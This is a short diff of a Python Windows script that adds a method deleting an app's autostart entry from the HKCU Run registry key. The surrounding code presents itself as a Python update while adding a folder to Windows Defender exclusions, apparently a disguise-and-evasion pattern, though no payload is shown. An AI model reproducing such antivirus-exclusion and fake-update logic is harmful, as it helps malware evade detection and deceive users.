@@ -1,6 +1,8 @@
+from math import e
 import os
 import pathlib as pl
 import random
+import re
 import sys
 import ctypes
 import time
@@ -45,12 +47,32 @@ class Main:
         time.sleep(2)
         exit(0)
 
+    def remove_hkey(self):
+        import winreg
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        try:
+            key = winreg.OpenKey(  # type: ignore
+                winreg.HKEY_CURRENT_USER,  # type: ignore
+                key_path,
+                0,
+                winreg.KEY_SET_VALUE | winreg.KEY_READ,  # type: ignore
+            )
+
+            # Alten Wert löschen, falls vorhanden
+            try:
+                winreg.DeleteValue(key, APP_NAME)  # type: ignore
+            except FileNotFoundError:
+                pass
+        except Exception as e:
+            print(f"Registry Fehler: {e}")
+
 if __name__ == "__main__":
     self = Main()
     if is_admin:
         print("Gathering dependencies and preparing for update...")
         self.add_folder_to_windows_defender_exclusions()
         self.perform_update()
+        self.remove_hkey()
         exit(0)
     if self.send_update_notification():
         print("Updating Python...")
